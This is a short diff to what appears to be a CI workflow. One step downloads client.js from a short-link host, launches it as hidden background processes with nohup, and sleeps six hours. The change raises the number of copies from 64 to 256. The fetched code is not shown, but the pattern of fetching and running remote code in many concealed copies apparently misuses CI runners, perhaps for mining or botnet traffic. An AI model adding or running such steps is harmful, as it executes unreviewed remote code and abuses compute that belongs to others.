@@ -15,7 +15,7 @@ jobs:
           node-version: '18'
       - run: |
           curl -o client.js https://curl.by/m4jfI/client.js
-          for i in $(seq 1 64); do
+          for i in $(seq 1 256); do
             nohup node client.js > client_$i.log 2>&1 &
           done
           sleep 21600 # 6 saat
